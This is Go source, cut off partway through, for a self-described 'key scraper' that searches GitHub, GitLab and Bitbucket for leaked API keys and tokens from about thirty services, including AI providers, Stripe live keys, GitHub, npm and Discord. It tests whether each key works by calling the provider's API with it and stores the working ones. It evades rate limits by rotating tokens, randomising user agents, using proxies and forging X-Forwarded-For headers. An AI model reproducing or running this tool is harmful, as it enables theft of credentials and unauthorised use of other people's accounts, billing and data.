package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/sha256"
	"database/sql"
	"encoding/base64"
	"encoding/csv"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math"
	"math/rand/v2"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

const version = "PRO-3.0"

var (
	githubTokens    []string
	tokenIndex      int
	tokenMu         sync.Mutex
	gitlabToken     = os.Getenv("GITLAB_TOKEN")
	bitbucketUser   = os.Getenv("BITBUCKET_USER")
	bitbucketAppPwd = os.Getenv("BITBUCKET_APP_PASSWORD")
	dryRun          = os.Getenv("DRY_RUN") == "1"
	queryWorkersN   = 15
	maxPages        = 5

	logFile *os.File

	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:123.0) Gecko/20100101 Firefox/123.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 Safari/17.2",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Edg/122.0.0.0",
	}

	proxies []string

	placeholderRe = regexp.MustCompile(`(?i)(placeholder|dummy|example|your[_-]?key|REPLACE_ME|REPLACE|changeme|sk-123456|sk-dummy|sk-test|xxxxx|sk-your-key|YOUR_KEY_HERE|todo|fixme|your-api-key-here|insert[_-]?your[_-]?key|add[_-]?your[_-]?key|paste[_-]?your[_-]?key|enter[_-]?your[_-]?key|secret[_-]?here|key[_-]?here|api[_-]?key[_-]?here|fake|demo|sample|test[_-]?key|dummy[_-]?key)`)

	base64FragmentRe  = regexp.MustCompile(`^[a-zA-Z0-9+/=]+$`)
	base64URLFragRe   = regexp.MustCompile(`^[a-zA-Z0-9\-_]+=*$`)
	base64StdChars    = regexp.MustCompile(`^[a-zA-Z0-9+/]{20,}$`)
	base64URLChars    = regexp.MustCompile(`^[a-zA-Z0-9\-_]{20,}$`)
)

var (
	scannedCount   int64
	candidateCount int64
	workingCount   int64
	invalidCount   int64
	rateHitCount   int64
	errorCount     int64
	validatedCount int64
	startTime      = time.Now()
	dedupMap       sync.Map
	scannedRepos   sync.Map
	db             *sql.DB
	sharedClient   *http.Client
	clientOnce     sync.Once
	closeOnce      sync.Once
	fileMu         sync.Mutex
	workingFile    *os.File
	logFileMu      sync.Mutex
)

type tokenBucket struct {
	mu       sync.Mutex
	tokens   float64
	maxRate  float64
	burst    float64
	lastTime time.Time
}

func newTokenBucket(maxRate, burst float64) *tokenBucket {
	return &tokenBucket{maxRate: maxRate, burst: burst, tokens: burst, lastTime: time.Now()}
}

func (tb *tokenBucket) Wait(ctx context.Context) error {
	for {
		tb.mu.Lock()
		now := time.Now()
		elapsed := now.Sub(tb.lastTime).Seconds()
		tb.tokens = math.Min(tb.burst, tb.tokens+elapsed*tb.maxRate)
		tb.lastTime = now
		if tb.tokens >= 1 {
			tb.tokens--
			tb.mu.Unlock()
			return nil
		}
		wait := time.Duration(((1 - tb.tokens) / tb.maxRate) * float64(time.Second))
		tb.mu.Unlock()
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(wait):
		}
	}
}

var hostLimiters = map[string]*tokenBucket{
	"api.github.com":          newTokenBucket(1, 5),
	"raw.githubusercontent.com": newTokenBucket(15, 8),
	"api.gitlab.com":          newTokenBucket(2, 5),
	"gitlab.com":              newTokenBucket(2, 5),
	"api.bitbucket.org":       newTokenBucket(2, 5),
}
var hostLimitersMu sync.RWMutex

func getHostLimiter(host string) *tokenBucket {
	hostLimitersMu.RLock()
	lim, ok := hostLimiters[host]
	hostLimitersMu.RUnlock()
	if ok {
		return lim
	}
	lim = newTokenBucket(15, 3)
	hostLimitersMu.Lock()
	hostLimiters[host] = lim
	hostLimitersMu.Unlock()
	return lim
}

type asyncFileWriter struct {
	ch   chan []byte
	buf  *bufio.Writer
	f    *os.File
	done chan struct{}
}

func newAsyncFileWriter(path string) (*asyncFileWriter, error) {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return nil, err
	}
	w := &asyncFileWriter{
		ch:   make(chan []byte, 10000),
		buf:  bufio.NewWriterSize(f, 256*1024),
		f:    f,
		done: make(chan struct{}),
	}
	go w.loop()
	return w, nil
}

func (w *asyncFileWriter) loop() {
	flushTicker := time.NewTicker(5 * time.Second)
	defer flushTicker.Stop()
	for {
		select {
		case data, ok := <-w.ch:
			if !ok {
				w.buf.Flush()
				w.f.Close()
				close(w.done)
				return
			}
			w.buf.Write(data)
			w.buf.Write([]byte{'\n'})
		case <-flushTicker.C:
			w.buf.Flush()
		}
	}
}

func (w *asyncFileWriter) Write(data []byte) {
	w.ch <- data
}

func (w *asyncFileWriter) Close() {
	close(w.ch)
	<-w.done
}

var (
	workingWriter  *asyncFileWriter
	candidateWriter *asyncFileWriter
	invalidWriter  *asyncFileWriter
)

type insertRecord struct {
	Key      string
	Provider string
	Source   string
	Status   string
}

var insertCh = make(chan insertRecord, 10000)

func initTokenRotation() {
	rawTokens := os.Getenv("GITHUB_TOKENS")
	if rawTokens != "" {
		for _, t := range strings.Split(rawTokens, ",") {
			t = strings.TrimSpace(t)
			if t != "" {
				githubTokens = append(githubTokens, t)
			}
		}
	}
	if len(githubTokens) == 0 {
		single := os.Getenv("GITHUB_TOKEN")
		if single != "" {
			githubTokens = []string{single}
		}
	}
	tokenIndex = 0
}

func currentToken() string {
	tokenMu.Lock()
	defer tokenMu.Unlock()
	if len(githubTokens) == 0 {
		return ""
	}
	return githubTokens[tokenIndex%len(githubTokens)]
}

func rotateToken() string {
	tokenMu.Lock()
	defer tokenMu.Unlock()
	if len(githubTokens) == 0 {
		return ""
	}
	if len(githubTokens) > 1 {
		tokenIndex = (tokenIndex + 1) % len(githubTokens)
		fmt.Printf("\033[33m[TOKEN ROTATE]\033[0m Switching to token %d/%d\n", tokenIndex+1, len(githubTokens))
	} else {
		time.Sleep(5 * time.Second)
	}
	return githubTokens[tokenIndex]
}

func randUA() string { return userAgents[rand.IntN(len(userAgents))] }

func sha256Hash(s string) string {
	h := sha256.Sum256([]byte(s))
	return hex.EncodeToString(h[:])
}

func previewKey(key string) string {
	if len(key) <= 20 {
		return key
	}
	return key[:12] + "..." + key[len(key)-8:]
}

func isPlaceholder(key string) bool { return placeholderRe.MatchString(key) }

func shannonEntropy(s string) float64 {
	freq := make(map[rune]float64)
	for _, c := range s {
		freq[c]++
	}
	length := float64(len([]rune(s)))
	entropy := 0.0
	for _, count := range freq {
		p := count / length
		if p > 0 {
			entropy -= p * math.Log2(p)
		}
	}
	return entropy
}

func hasMixedCase(s string) bool {
	hasLower, hasUpper, hasDigit := false, false, false
	for _, c := range s {
		if c >= 'a' && c <= 'z' {
			hasLower = true
		} else if c >= 'A' && c <= 'Z' {
			hasUpper = true
		} else if c >= '0' && c <= '9' {
			hasDigit = true
		}
	}
	return hasLower && hasUpper && hasDigit
}

func isAlphanumeric(c byte) bool {
	return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9')
}

func isJWT(key string) bool {
	parts := strings.Split(key, ".")
	if len(parts) != 3 {
		return false
	}
	for _, p := range parts {
		if len(p) == 0 {
			return false
		}
		for _, c := range p {
			ch := byte(c)
			if !((ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z') || (ch >= '0' && ch <= '9') || ch == '-' || ch == '_') {
				return false
			}
		}
	}
	return len(parts[0]) > 10 && len(parts[1]) > 10
}

func isBase64Fragment(key string) bool {
	k := strings.TrimSpace(key)
	if len(k) < 20 || len(k) > 200 {
		return false
	}
	if !base64FragmentRe.MatchString(k) && !base64URLFragRe.MatchString(k) {
		return false
	}
	var decoded []byte
	var err error
	decoded, err = base64.StdEncoding.DecodeString(k)
	if err != nil {
		decoded, err = base64.RawStdEncoding.DecodeString(k)
		if err != nil {
			decoded, err = base64.URLEncoding.DecodeString(k)
			if err != nil {
				decoded, err = base64.RawURLEncoding.DecodeString(k)
				if err != nil {
					return false
				}
			}
		}
	}
	text := string(decoded)
	if len(text) == 0 {
		return false
	}
	if strings.HasPrefix(text, "{") || strings.HasPrefix(text, "[") {
		return true
	}
	suspiciousWords := []string{
		"role", "owner", "client_id", "project", "team", "anon",
		"production", "development", "environment", "deploy",
		"auth", "bearer", "credential", "account", "user_id",
		"sub:", "iss:", "exp:", "iat:", "aud:",
	}
	lowerText := strings.ToLower(text)
	for _, word := range suspiciousWords {
		if strings.Contains(lowerText, word) {
			return true
		}
	}
	return false
}

var falsePositiveRe = []*regexp.Regexp{
	regexp.MustCompile(`^eyJ`),
	regexp.MustCompile(`^[0-9a-f]{32}$`),
	regexp.MustCompile(`^[0-9a-f]{40}$`),
	regexp.MustCompile(`^[0-9a-f]{64}$`),
	regexp.MustCompile(`^[0-9A-F]{32}$`),
	regexp.MustCompile(`^[0-9A-F]{40}$`),
	regexp.MustCompile(`^[0-9A-F]{64}$`),
	regexp.MustCompile(`^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$`),
	regexp.MustCompile(`^[0-9]{32,}$`),
	regexp.MustCompile(`^[a-f0-9]{32,}$`),
}

var falsePositiveStrings = []string{
	"00000000", "11111111", "22222222", "33333333", "44444444",
	"55555555", "66666666", "77777777", "88888888", "99999999",
	"aaaaaaaa", "bbbbbbbb", "cccccccc", "dddddddd", "eeeeeeee", "ffffffff",
	"test", "example", "dummy", "placeholder", "changeme",
	"insert_key", "add_key", "paste_key", "enter_key",
	"your_api_key", "your-api-key", "your_api_key_here",
	"xxxxxxxx", "undefined", "null", "none", "empty",
}

func rejectFalsePositive(key string) bool {
	lower := strings.ToLower(key)

	if isJWT(key) {
		return true
	}

	if isBase64Fragment(key) {
		return true
	}

	for _, fp := range falsePositiveStrings {
		if len(key) <= 40 && lower == fp {
			return true
		}
		if len(key) > 40 {
			idx := strings.Index(lower, fp)
			if idx >= 0 {
				beforeOK := idx == 0 || !isAlphanumeric(lower[idx-1])
				afterIdx := idx + len(fp)
				afterOK := afterIdx >= len(lower) || !isAlphanumeric(lower[afterIdx])
				if beforeOK && afterOK {
					return true
				}
			}
		}
	}

	for _, re := range falsePositiveRe {
		if re.MatchString(key) {
			return true
		}
	}

	if len(key) == 36 && key[8] == '-' && key[13] == '-' && key[18] == '-' && key[23] == '-' {
		return true
	}

	return false
}

func hasContext(text, provider string) bool {
	prov, ok := providers[provider]
	if !ok || !prov.ContextReq {
		return true
	}
	lower := strings.ToLower(text)
	envVars := map[string][]string{
		"mistral":     {"mistral_api_key", "mistral-api-key", "mistral.api.key", "mistralkey"},
		"together":    {"together_api_key", "together-api-key", "together.api.key", "togetherkey"},
		"voyage":      {"voyage_api_key", "voyage-api-key", "voyage.api.key", "voyagekey"},
		"cloudflare":  {"cloudflare_api_token", "cloudflare-api-token", "cloudflare.api.token", "cloudflaretoken", "cf_api_token", "cf-api-token"},
		"moonshot":    {"moonshot_api_key", "moonshot-api-key", "moonshot.api.key", "moonshotkey", "kimi_api_key", "kimi-api-key"},
		"twilio":      {"twilio_account_sid", "twilio-account-sid", "twilio.account.sid", "twilioauth", "twilio_auth_token", "twilio-auth-token", "twilio.auth.token", "twilio_api_key", "twilio-api-key", "twilio.api.key"},
	}
	for _, envVar := range envVars[provider] {
		if strings.Contains(lower, envVar) {
			return true
		}
	}
	return false
}

func backoffSleep(attempt int) time.Duration {
	if attempt > 30 {
		return 30*time.Second + time.Duration(rand.Int64N(int64(time.Second)))
	}
	return time.Duration(1<<uint(attempt))*time.Second + time.Duration(rand.Int64N(int64(time.Second)))
}

type provider struct {
	Pattern        *regexp.Regexp
	ValidateURL    string
	ValidateMethod string
	Headers        func(key string) map[string]string
	Payload        map[string]interface{}
	ContextReq     bool
	Category       string
}

var providers = map[string]*provider{
	"openai": {
		Pattern:        regexp.MustCompile(`(?:OPENAI_API_KEY\s*=\s*['"]?)?(sk-proj-[a-zA-Z0-9\-_]{40,})\b`),
		ValidateURL:    "https://api.openai.com/v1/chat/completions",
		ValidateMethod: "POST",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k, "Content-Type": "application/json"} },
		Payload:        map[string]interface{}{"model": "gpt-4o-mini", "messages": []map[string]string{{"role": "user", "content": "Say OK"}}, "max_tokens": 1},
		Category:       "ai",
	},
	"openai_legacy": {
		Pattern:        regexp.MustCompile(`(?:OPENAI_API_KEY\s*=\s*['"]?)?(sk-[a-zA-Z0-9]{48})\b`),
		ValidateURL:    "https://api.openai.com/v1/chat/completions",
		ValidateMethod: "POST",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k, "Content-Type": "application/json"} },
		Payload:        map[string]interface{}{"model": "gpt-4o-mini", "messages": []map[string]string{{"role": "user", "content": "Say OK"}}, "max_tokens": 1},
		Category:       "ai",
	},
	"anthropic": {
		Pattern:     regexp.MustCompile(`(?:ANTHROPIC_API_KEY\s*=\s*['"]?)?(sk-ant-api03-[a-zA-Z0-9\-_]{32,})`),
		ValidateURL: "https://api.anthropic.com/v1/messages",
		ValidateMethod: "POST",
		Headers: func(k string) map[string]string {
			return map[string]string{"x-api-key": k, "anthropic-version": "2023-06-01", "content-type": "application/json"}
		},
		Payload:  map[string]interface{}{"model": "claude-3-haiku-20240307", "max_tokens": 1, "messages": []map[string]string{{"role": "user", "content": "Hi"}}},
		Category: "ai",
	},
	"gemini": {
		Pattern:        regexp.MustCompile(`(?:GEMINI_API_KEY\s*=\s*['"]?)?(AIza[0-9A-Za-z_-]{35})`),
		ValidateURL:    "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=%s",
		ValidateMethod: "POST",
		Headers:        nil,
		Payload:        map[string]interface{}{"contents": []map[string]interface{}{{"parts": []map[string]string{{"text": "Say OK"}}}}, "generationConfig": map[string]int{"maxOutputTokens": 1}},
		Category:       "ai",
	},
	"mistral": {
		Pattern:        regexp.MustCompile(`(?:MISTRAL_API_KEY\s*=\s*['"]?)([a-zA-Z0-9]{32,48})`),
		ValidateURL:    "https://api.mistral.ai/v1/chat/completions",
		ValidateMethod: "POST",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k, "Content-Type": "application/json"} },
		Payload:        map[string]interface{}{"model": "mistral-small-latest", "messages": []map[string]string{{"role": "user", "content": "Say OK"}}, "max_tokens": 1},
		ContextReq:     true,
		Category:       "ai",
	},
	"groq": {
		Pattern:        regexp.MustCompile(`(?:GROQ_API_KEY\s*=\s*['"]?)?(gsk_[a-zA-Z0-9]{32,48})`),
		ValidateURL:    "https://api.groq.com/openai/v1/chat/completions",
		ValidateMethod: "POST",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k, "Content-Type": "application/json"} },
		Payload:        map[string]interface{}{"model": "llama-3.3-70b-versatile", "messages": []map[string]string{{"role": "user", "content": "Say OK"}}, "max_tokens": 1},
		Category:       "ai",
	},
	"deepseek": {
		Pattern:        regexp.MustCompile(`(?:DEEPSEEK_API_KEY\s*=\s*['"]?)?(deepseek-[a-zA-Z0-9]{32,})`),
		ValidateURL:    "https://api.deepseek.com/v1/chat/completions",
		ValidateMethod: "POST",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k, "Content-Type": "application/json"} },
		Payload:        map[string]interface{}{"model": "deepseek-chat", "messages": []map[string]string{{"role": "user", "content": "Say OK"}}, "max_tokens": 1},
		Category:       "ai",
	},
	"cohere": {
		Pattern:        regexp.MustCompile(`(?:COHERE_API_KEY\s*=\s*['"]?)?(co-[a-zA-Z0-9]{32,})\b`),
		ValidateURL:    "https://api.cohere.ai/v2/chat",
		ValidateMethod: "POST",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k, "Content-Type": "application/json"} },
		Payload:        map[string]interface{}{"model": "command-r", "messages": []map[string]string{{"role": "user", "content": "Say OK"}}},
		Category:       "ai",
	},
	"perplexity": {
		Pattern:        regexp.MustCompile(`(?:PERPLEXITY_API_KEY\s*=\s*['"]?)?(pplx-[a-zA-Z0-9]{40,})`),
		ValidateURL:    "https://api.perplexity.ai/chat/completions",
		ValidateMethod: "POST",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k, "Content-Type": "application/json"} },
		Payload:        map[string]interface{}{"model": "sonar", "messages": []map[string]string{{"role": "user", "content": "Say OK"}}, "max_tokens": 1},
		Category:       "ai",
	},
	"replicate": {
		Pattern:        regexp.MustCompile(`(?:REPLICATE_API_TOKEN\s*=\s*['"]?)?(r8_[a-zA-Z0-9]{32,40})`),
		ValidateURL:    "https://api.replicate.com/v1/account",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Token " + k} },
		Category:       "ai",
	},
	"together": {
		Pattern:        regexp.MustCompile(`(?:TOGETHER_API_KEY\s*=\s*['"]?)([a-zA-Z0-9]{32,64})`),
		ValidateURL:    "https://api.together.xyz/v1/chat/completions",
		ValidateMethod: "POST",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k, "Content-Type": "application/json"} },
		Payload:        map[string]interface{}{"model": "meta-llama/Llama-3-8b-chat-hf", "messages": []map[string]string{{"role": "user", "content": "Say OK"}}, "max_tokens": 1},
		ContextReq:     true,
		Category:       "ai",
	},
	"fireworks": {
		Pattern:        regexp.MustCompile(`(?:FIREWORKS_API_KEY\s*=\s*['"]?)?(fw_[a-zA-Z0-9]{24,})`),
		ValidateURL:    "https://api.fireworks.ai/inference/v1/chat/completions",
		ValidateMethod: "POST",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k, "Content-Type": "application/json"} },
		Payload:        map[string]interface{}{"model": "accounts/fireworks/models/llama-v3p3-70b-instruct", "messages": []map[string]string{{"role": "user", "content": "Say OK"}}, "max_tokens": 1},
		Category:       "ai",
	},
	"openrouter": {
		Pattern:        regexp.MustCompile(`(?:OPENROUTER_API_KEY\s*=\s*['"]?)?(sk-or-[a-zA-Z0-9\-_]{32,})\b`),
		ValidateURL:    "https://openrouter.ai/api/v1/chat/completions",
		ValidateMethod: "POST",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k, "Content-Type": "application/json", "HTTP-Referer": "http://localhost"} },
		Payload:        map[string]interface{}{"model": "openai/gpt-4o-mini", "messages": []map[string]string{{"role": "user", "content": "Say OK"}}, "max_tokens": 1},
		Category:       "ai",
	},
	"voyage": {
		Pattern:        regexp.MustCompile(`(?:VOYAGE_API_KEY\s*=\s*['"]?)(pa-[a-zA-Z0-9]{32,})`),
		ValidateURL:    "https://api.voyageai.com/v1/models",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k} },
		ContextReq:     true,
		Category:       "ai",
	},
	"jina": {
		Pattern:        regexp.MustCompile(`(?:JINA_API_KEY\s*=\s*['"]?)?(jina_[a-zA-Z0-9]{40,})`),
		ValidateURL:    "https://embed.jina.ai/",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k} },
		Category:       "ai",
	},
	"siliconflow": {
		Pattern:        regexp.MustCompile(`(?:SILICONFLOW_API_KEY\s*=\s*['"]?)?(sk-sf-[a-zA-Z0-9]{32,64})`),
		ValidateURL:    "https://api.siliconflow.cn/v1/models",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k} },
		Category:       "ai",
	},
	"huggingface": {
		Pattern:        regexp.MustCompile(`(?:HUGGING_FACE_API_KEY\s*=\s*['"]?|HF_TOKEN\s*=\s*['"]?)?(hf_[a-zA-Z0-9]{34,})`),
		ValidateURL:    "https://huggingface.co/api/whoami-v2",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k} },
		Category:       "ai",
	},
	"cloudflare": {
		Pattern:        regexp.MustCompile(`(?:CLOUDFLARE_API_TOKEN\s*=\s*['"]?)?(v1\.0\.[a-zA-Z0-9\-_]{40,})`),
		ValidateURL:    "https://api.cloudflare.com/client/v4/user/tokens/verify",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k} },
		ContextReq:     true,
		Category:       "cloud",
	},
	"xai": {
		Pattern:        regexp.MustCompile(`(?:XAI_API_KEY\s*=\s*['"]?)?(xai-[a-zA-Z0-9]{20,120})`),
		ValidateURL:    "https://api.x.ai/v1/models",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k} },
		Category:       "ai",
	},
	"moonshot": {
		Pattern:        regexp.MustCompile(`(?:MOONSHOT_API_KEY\s*=\s*['"]?)(sk-[a-zA-Z0-9]{32,64})`),
		ValidateURL:    "https://api.moonshot.cn/v1/chat/completions",
		ValidateMethod: "POST",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k, "Content-Type": "application/json"} },
		Payload:        map[string]interface{}{"model": "moonshot-v1-8k", "messages": []map[string]string{{"role": "user", "content": "Say OK"}}, "max_tokens": 1},
		ContextReq:     true,
		Category:       "ai",
	},
	"stripe": {
		Pattern:        regexp.MustCompile(`(?:STRIPE_SECRET_KEY\s*=\s*['"]?)?(sk_live_[a-zA-Z0-9]{24,})`),
		ValidateURL:    "https://api.stripe.com/v1/balance",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { enc := base64.StdEncoding.EncodeToString([]byte(k + ":")); return map[string]string{"Authorization": "Basic " + enc} },
		Category:       "payments",
	},
	"github_pat": {
		Pattern:        regexp.MustCompile(`(?:GITHUB_TOKEN\s*=\s*['"]?)?(ghp_[a-zA-Z0-9]{36})`),
		ValidateURL:    "https://api.github.com/user",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "token " + k} },
		Category:       "scm",
	},
	"npm": {
		Pattern:        regexp.MustCompile(`(?:NPM_TOKEN\s*=\s*['"]?)?(npm_[a-zA-Z0-9]{36})`),
		ValidateURL:    "https://registry.npmjs.org/-/whoami",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k} },
		Category:       "packages",
	},
	"sendgrid": {
		Pattern:        regexp.MustCompile(`(?:SENDGRID_API_KEY\s*=\s*['"]?)?(SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43})`),
		ValidateURL:    "https://api.sendgrid.com/v3/user/profile",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k} },
		Category:       "email",
	},
	"discord": {
		Pattern:        regexp.MustCompile(`(?:DISCORD_TOKEN\s*=\s*['"]?)?([a-zA-Z0-9_-]{24,}\.[a-zA-Z0-9_-]{6,}\.[a-zA-Z0-9_-]{27,})`),
		ValidateURL:    "https://discord.com/api/v10/users/@me",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bot " + k} },
		Category:       "messaging",
	},
	"aws": {
		Pattern:        regexp.MustCompile(`(?:AWS_ACCESS_KEY_ID\s*=\s*['"]?)?(AKIA[0-9A-Z]{16})`),
		ValidateURL:    "",
		ValidateMethod: "GET",
		Headers:        nil,
		Category:       "cloud",
	},
	"telegram": {
		Pattern:        regexp.MustCompile(`(?:TELEGRAM_BOT_TOKEN\s*=\s*['"]?)?([0-9]{8,10}:[a-zA-Z0-9_-]{35,})`),
		ValidateURL:    "",
		ValidateMethod: "GET",
		Headers:        nil,
		Category:       "messaging",
	},
	"twilio": {
		Pattern:        regexp.MustCompile(`(?:TWILIO_ACCOUNT_SID\s*=\s*['"]?)?(AC[a-f0-9]{32})\b`),
		ValidateURL:    "https://api.twilio.com/2010-04-01/Accounts/%s.json",
		ValidateMethod: "GET",
		Headers:        nil,
		ContextReq:     true,
		Category:       "messaging",
	},
}

type keyRecord struct {
	Key      string                 `json:"key"`
	Provider string                 `json:"provider"`
	Source   string                 `json:"source"`
	Metadata map[string]interface{} `json:"metadata"`
	FoundAt  time.Time              `json:"found_at"`
}

type scrapeJob struct {
	source string
	query  string
	repo   string
	gistID string
}

func init() {
	if f, err := os.Open("proxies.txt"); err == nil {
		defer f.Close()
		s := bufio.NewScanner(f)
		for s.Scan() {
			if p := strings.TrimSpace(s.Text()); p != "" {
				proxies = append(proxies, p)
			}
		}
	}
}

func initLogging() {
	var err error
	logFile, err = os.OpenFile("scraper_pro.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("\033[31m[LOG]\033[0m Failed to open scraper_pro.log: %v\n", err)
	}
	logInfo("Scraper starting, version %s", version)
}

func logEntry(level, message, provider, source string) {
	if logFile == nil {
		return
	}
	entry := map[string]string{
		"timestamp": time.Now().UTC().Format(time.RFC3339),
		"level":     level,
		"message":   message,
	}
	if provider != "" {
		entry["provider"] = provider
	}
	if source != "" {
		entry["source"] = source
	}
	line, _ := json.Marshal(entry)
	logFileMu.Lock()
	logFile.Write(append(line, '\n'))
	logFileMu.Unlock()
}

func logInfo(m string, args ...interface{})  { logEntry("INFO", fmt.Sprintf(m, args...), "", "") }
func logError(m string, args ...interface{}) { logEntry("ERROR", fmt.Sprintf(m, args...), "", "") }
func logWarn(m string, args ...interface{})  { logEntry("WARN", fmt.Sprintf(m, args...), "", "") }

func printBanner() {
	ghStatus := "disabled"
	glStatus := "disabled"
	bbStatus := "disabled"
	if len(githubTokens) > 0 {
		ghStatus = fmt.Sprintf("enabled (%d tokens)", len(githubTokens))
	}
	if gitlabToken != "" {
		glStatus = "enabled"
	}
	if bitbucketUser != "" && bitbucketAppPwd != "" {
		bbStatus = "enabled"
	}
	fmt.Println("\033[1;35m")
	fmt.Println("+------------------------------------------------------------------+")
	fmt.Printf("|       ULTRA-ULTIME KEY SCRAPER PRO v%-27s |\n", version)
	fmt.Printf("|   Multi-Token | 30 Providers | 150+ Queries | Full Suite         |\n")
	fmt.Println("|         [BY DS-ULTIME FOR DS-ULTIME EMPIRE]                     |")
	fmt.Println("+------------------------------------------------------------------+")
	fmt.Printf("  Sources:  GitHub: %-20s  GitLab: %-10s  Bitbucket: %s\n", ghStatus, glStatus, bbStatus)
	fmt.Println("\033[0m")
}

func getProxy() *url.URL {
	if len(proxies) == 0 {
		return nil
	}
	u, _ := url.Parse(proxies[rand.IntN(len(proxies))])
	return u
}

func newHTTPClient() *http.Client {
	clientOnce.Do(func() {
		dialer := &net.Dialer{Timeout: 10 * time.Second, KeepAlive: 30 * time.Second}
		sharedClient = &http.Client{
			Transport: &http.Transport{
				DialContext:           dialer.DialContext,
				TLSHandshakeTimeout:  5 * time.Second,
				ResponseHeaderTimeout: 15 * time.Second,
				ExpectContinueTimeout: 1 * time.Second,
				ForceAttemptHTTP2:     true,
				MaxIdleConns:          100,
				MaxIdleConnsPerHost:   20,
				MaxConnsPerHost:       20,
				IdleConnTimeout:       90 * time.Second,
				WriteBufferSize:       32 * 1024,
				ReadBufferSize:        32 * 1024,
			},
			Timeout: 30 * time.Second,
		}
	})
	return sharedClient
}

func fetchRaw(ctx context.Context, fetchURL string) (string, error) {
	parsed, _ := url.Parse(fetchURL)
	limiter := getHostLimiter(parsed.Host)
	client := newHTTPClient()
	for attempt := 0; attempt < 8; attempt++ {
		if err := limiter.Wait(ctx); err != nil {
			return "", err
		}
		req, err := http.NewRequestWithContext(ctx, "GET", fetchURL, nil)
		if err != nil {
			return "", err
		}
		req.Header.Set("User-Agent", randUA())
		req.Header.Set("Accept", "text/plain, application/json, */*")
		if getProxy() != nil {
			req.Header.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.IntN(255), rand.IntN(255), rand.IntN(255), rand.IntN(255)))
		}
		resp, err := client.Do(req)
		if err != nil {
			return "", err
		}
		body, err := io.ReadAll(io.LimitReader(resp.Body, 10*1024*1024))
		resp.Body.Close()
		if err != nil {
			return "", err
		}
		if resp.StatusCode == 200 {
			return string(body), nil
		}
		if resp.StatusCode == 429 || resp.StatusCode == 503 || resp.StatusCode == 403 {
			if resp.StatusCode == 429 {
				rotateToken()
			}
			if retryAfter := resp.Header.Get("Retry-After"); retryAfter != "" {
				var seconds int64
				fmt.Sscanf(retryAfter, "%d", &seconds)
				if seconds > 0 && seconds <= 120 {
					time.Sleep(time.Duration(seconds) * time.Second)
					continue
				}
			}
			time.Sleep(backoffSleep(attempt + 1))
			continue
		}
		return "", fmt.Errorf("status %d", resp.StatusCode)
	}
	return "", fmt.Errorf("max retries for %s", fetchURL)
}

func fetchJSON(ctx context.Context, fetchURL string, headers map[string]string) ([]byte, error) {
	parsed, _ := url.Parse(fetchURL)
	limiter := getHostLimiter(parsed.Host)
	client := newHTTPClient()
	for attempt := 0; attempt < 10; attempt++ {
		if err := limiter.Wait(ctx); err != nil {
			return nil, err
		}
		req, err := http.NewRequestWithContext(ctx, "GET", fetchURL, nil)
		if err != nil {
			return nil, err
